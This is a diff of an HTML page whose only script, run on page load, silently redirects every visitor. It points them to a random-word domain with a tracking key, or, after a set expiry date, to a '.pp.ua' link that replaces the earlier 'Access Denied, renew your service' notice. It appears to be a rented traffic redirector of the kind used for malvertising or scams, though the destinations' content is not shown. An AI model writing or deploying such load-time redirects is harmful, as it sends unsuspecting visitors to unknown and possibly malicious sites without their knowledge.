@@ -88,6 +88,8 @@
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, proxy-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
+
+    
 </head>
 
 <body>
@@ -95,22 +97,16 @@
         function checkExpiration() {
             const expirationDate = "2025-03-26";
             const today = new Date().toISOString().split("T")[0];
+            const adminurl = "https://alink.pp.ua/duckist";
 
             if (today > expirationDate) {
-                document.body.innerHTML = `
-                    <div style="display: flex; align-items: center; justify-content: center; height: 100vh; background-color: #f8d7da; color: #721c24; text-align: center; font-family: Arial, sans-serif;">
-                        <div style="padding: 20px; border: 2px solid #f5c6cb; background-color: #f8d7da; border-radius: 8px;">
-                            <h2>⚠️ Access Denied</h2>
-                            <p>This page is expired.</p>
-                            <p>Please renew your service or this page will remained inactive.</p>
-                        </div>
-                    </div>
-                `;
+                window.location.href = adminurl;
             } else {
-                const redirectUrl = "https://celebratebewildered.com/p4ma2zefzk?key=417a5a7f354c40ceb8ae4eeea6dcf050";
+                const redirectUrl = "https://nylonthrillingplanned.com/p4ma2zefzk?key=417a5a7f354c40ceb8ae4eeea6dcf050";
                 window.location.href = redirectUrl;
             }
         }
+
         window.onload = checkExpiration;
     </script>
 </body>
